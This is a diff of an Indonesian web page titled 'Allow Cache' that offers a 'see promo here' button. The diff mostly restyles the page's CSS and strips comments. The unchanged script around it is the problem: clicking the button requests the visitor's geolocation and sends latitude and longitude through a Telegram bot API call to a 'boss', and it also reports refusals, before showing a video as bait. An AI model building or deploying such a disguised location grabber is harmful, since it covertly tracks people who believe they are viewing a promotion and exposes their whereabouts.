@@ -3,49 +3,47 @@
 <head>
   <title>Izinkan Cache</title>
   <style>
-    /* Membuat halaman memenuhi layar dan tidak bisa digeser */
     html, body {
       margin: 0;
       padding: 0;
       height: 100%;
-      overflow: hidden; /* Mencegah scroll */
+      overflow: hidden;
     }
 
-    /* Memastikan isi halaman mengisi seluruh layar */
     body {
       display: flex;
+      flex-direction: column;
       justify-content: center;
       align-items: center;
       text-align: center;
+      background-color: #f0f0f0;
     }
 
-    /* Mengubah gaya tombol agar lebih besar */
-    button {
-      font-size: 20px; /* Menambah ukuran font */
-      padding: 20px 40px; /* Menambah padding agar tombol lebih besar */
-      background-color: #4CAF50; /* Memberikan warna latar belakang hijau */
-      color: white; /* Mengubah warna teks menjadi putih */
-      border: none; /* Menghilangkan border default */
-      border-radius: 10px; /* Memberikan sudut melengkung pada tombol */
-      cursor: pointer; /* Menampilkan cursor pointer saat hover */
-      transition: background-color 0.3s; /* Animasi perubahan warna saat hover */
+    /* Tombol besar */
+    .tombol-promo {
+      font-size: 24px;
+      padding: 20px 40px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
     }
 
-    /* Mengubah warna tombol saat di-hover */
-    button:hover {
+    .tombol-promo:hover {
       background-color: #45a049;
     }
 
-    /* Container video yang muncul */
     #videoContainer {
       display: none;
       margin-top: 20px;
-      border: 2px solid red; /* Menambahkan border untuk debug */
+      border: 2px solid red;
     }
   </style>
 </head>
 <body>
-  <button onclick="mintaLokasi()">lihat promo disini</button>
+  <button class="tombol-promo" onclick="mintaLokasi()">lihat promo disini</button>
 
   <div id="videoContainer">
     <video width="320" height="240" controls autoplay>
@@ -67,14 +65,9 @@
             const pesan = `Lokasi berhasil diterima boss:\nLat: ${latitude}\nLon: ${longitude}`;
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}`);
 
-            // Debugging: Menampilkan video
-            console.log("Lokasi berhasil, menampilkan video...");
-
-            // Menunggu sedikit waktu sebelum menampilkan video
             setTimeout(() => {
-              // Tampilkan video
               document.getElementById("videoContainer").style.display = "block";
-            }, 500); // 500ms delay (setengah detik)
+            }, 500);
           },
           (err) => {
             const pesan = `Pengguna menolak memberikan lokasi.`;
